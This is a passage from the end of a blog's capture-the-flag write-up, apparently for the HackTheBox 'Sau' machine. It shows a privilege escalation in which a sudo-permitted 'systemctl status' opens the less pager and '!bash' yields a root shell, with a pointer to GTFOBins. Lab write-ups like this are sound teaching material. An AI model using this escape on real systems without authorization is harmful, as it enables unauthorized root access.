</span></span><span class="line"><span class="cl">             <span class="err">‚îú‚îÄ</span><span class="mi">1047</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">systemctl</span> <span class="n">status</span> <span class="n">trail</span><span class="o">.</span><span class="n">service</span>
</span></span><span class="line"><span class="cl">             <span class="err">‚îú‚îÄ</span><span class="mi">1049</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">systemctl</span> <span class="n">status</span> <span class="n">trail</span><span class="o">.</span><span class="n">service</span>
</span></span><span class="line"><span class="cl">             <span class="err">‚îú‚îÄ</span><span class="mi">1050</span> <span class="n">pager</span>
</span></span><span class="line"><span class="cl">             <span class="err">‚îú‚îÄ</span><span class="mi">1052</span> <span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
</span></span><span class="line"><span class="cl">             <span class="err">‚îú‚îÄ</span><span class="mi">1053</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
</span></span><span class="line"><span class="cl">             <span class="err">‚îú‚îÄ</span><span class="mi">1067</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="n">logger</span> <span class="o">-</span><span class="n">p</span> <span class="n">auth</span><span class="o">.</span><span class="n">info</span> <span class="o">-</span><span class="n">t</span> <span class="s2">&#34;maltrail[895]&#34;</span> <span class="s2">&#34;Failed p&gt;</span>
</span></span><span class="line"><span class="cl">             <span class="err">‚îú‚îÄ</span><span class="mi">1068</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="n">logger</span> <span class="o">-</span><span class="n">p</span> <span class="n">auth</span><span class="o">.</span><span class="n">info</span> <span class="o">-</span><span class="n">t</span> <span class="s2">&#34;maltrail[895]&#34;</span> <span class="s2">&#34;Failed p&gt;</span>
</span></span><span class="line"><span class="cl">             <span class="err">‚îú‚îÄ</span><span class="mi">1071</span> <span class="n">sh</span>
</span></span><span class="line"><span class="cl"><span class="n">lines</span> <span class="mi">1</span><span class="o">-</span><span class="mi">23</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We immediately get this <code>terminal not fully functional</code> warning, which is something I instantly recognize. This is common for interactive file viewers such as <code>more</code> or <code>less</code>, when viewed from a reverse shell as we are. These commands are particularly dangerous to run with elevated privileges, as we can often use !bash to open an interactive shell session as the elevated user.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">             ‚îú‚îÄ1067 /bin/sh -c logger -p auth.info -t &#34;maltrail[895]&#34; &#34;Failed p&gt;
</span></span><span class="line"><span class="cl">             ‚îú‚îÄ1068 /bin/sh -c logger -p auth.info -t &#34;maltrail[895]&#34; &#34;Failed p&gt;
</span></span><span class="line"><span class="cl">             ‚îú‚îÄ1071 sh
</span></span><span class="line"><span class="cl">lines 1-23!bbaasshh!bash
</span></span><span class="line"><span class="cl">root@sau:/opt/maltrail# id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root)
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is some disorienting echoing going on, but when I input the <code>!bash</code> command and hit enter, I am dropped into a root session! With this, we have fully compromised the system.</p>
<h2 id="alternative-information-gathering">Alternative information gathering
</h2><h3 id="finding-the-usage-of-less-through-help-menu">Finding the usage of less through help menu
</h3><p>We can also figure out very easily that the sudo command we are using is indeed utilizing <code>less</code>. By pressing <code>h</code> for help, we are given the summary of less commands:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">             ‚îú‚îÄ1068 /bin/sh -c logger -p auth.info -t &#34;maltrail[895]&#34; &#34;Failed p&gt;
</span></span><span class="line"><span class="cl">             ‚îú‚îÄ1071 sh
</span></span><span class="line"><span class="cl">lines 1-23...skipping...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                   SUMMARY OF LESS COMMANDS
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      Commands marked with * may be preceded by a number, N.
</span></span><span class="line"><span class="cl">      Notes in parentheses indicate the behavior if N is given.
</span></span><span class="line"><span class="cl">      A key preceded by a caret indicates the Ctrl key; thus ^K is ctrl-K.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  h  H                 Display this help.
</span></span><span class="line"><span class="cl">  q  :q  Q  :Q  ZZ     Exit.
</span></span><span class="line"><span class="cl"> ---------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                           MOVING
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  e  ^E  j  ^N  CR  *  Forward  one line   (or N lines).
</span></span><span class="line"><span class="cl">  y  ^Y  k  ^K  ^P  *  Backward one line   (or N lines).
</span></span><span class="line"><span class="cl">  f  ^F  ^V  SPACE  *  Forward  one window (or N lines).
</span></span><span class="line"><span class="cl">  b  ^B  ESC-v      *  Backward one window (or N lines).
</span></span><span class="line"><span class="cl">  z                 *  Forward  one window (and set window to N).
</span></span><span class="line"><span class="cl">  w                 *  Backward one window (and set window to N).
</span></span><span class="line"><span class="cl">  ESC-SPACE         *  Forward  one window, but don&#39;t stop at end-of-file.
</span></span><span class="line"><span class="cl">  d  ^D             *  Forward  one half-window (and set half-window to N).
</span></span><span class="line"><span class="cl">  u  ^U             *  Backward one half-window (and set half-window to N).
</span></span><span class="line"><span class="cl">  ESC-)  RightArrow *  Right one half screen width (or N positions).
</span></span><span class="line"><span class="cl">HELP -- Press RETURN for more, or q when done
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="using-gtfobins-to-discover-how-to-abuse-less-or-systemctl">Using GTFOBins to discover how to abuse less or systemctl
</h3><p>If we happen to be unfamiliar with this form of <code>less</code> escape, we can refer to <a class="link" href="https://gtfobins.github.io/gtfobins/less/"  target="_blank" rel="noopener"
    >gtfobins</a>. Additionally if we had trouble recognizing less, <a class="link" href="https://gtfobins.github.io/gtfobins/systemctl/#sudo"  target="_blank" rel="noopener"
    >gtfobins also mentions it on systemctl&rsquo;s page</a></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/ssrf/">SSRF</a>
        
            <a href="/tags/command-injection/">Command Injection</a>
        
            <a href="/tags/sudo/">Sudo</a>
        
            <a href="/tags/less/">Less</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/hackthebox-devvortex/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-devvortex/Devvortex.61ba3466bff8da52f89d2bb6417fb83a_hu4257021157125360887.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Devvortex"
                        
                        data-hash="md5-Ybo0Zr/42lL4nSu2QX&#43;4Og==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Devvortex</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-surveillance/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-surveillance/Surveillance.8b9fd8fd814572f9ed8f343a005ca93c_hu1936471103572467903.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Surveillance"
                        
                        data-hash="md5-i5/Y/YFFcvntjzQ6AFypPA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Surveillance</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-appsanity/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-appsanity/Appsanity.0223e51c64a4d8d3b0f0bd1a2973a1bc_hu1968093157442597824.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Appsanity"
                        
                        data-hash="md5-AiPlHGSk2NOw8L0aKXOhvA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Appsanity</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-cozyhosting/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-cozyhosting/CozyHosting.5c10fb7439d426645511c0790ed3ccb2_hu14458983025777190956.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - CozyHosting"
                        
                        data-hash="md5-XBD7dDnUJmRVEcB5DtPMsg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - CozyHosting</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-format/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-format/Format.910e024119b03811cd8466e187bde5fe_hu12179815748093413314.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Format"
                        
                        data-hash="md5-kQ4CQRmwOBHNhGbhh73l/g==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Format</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (typeof DISQUS == 'object') {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2024 Spencer&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
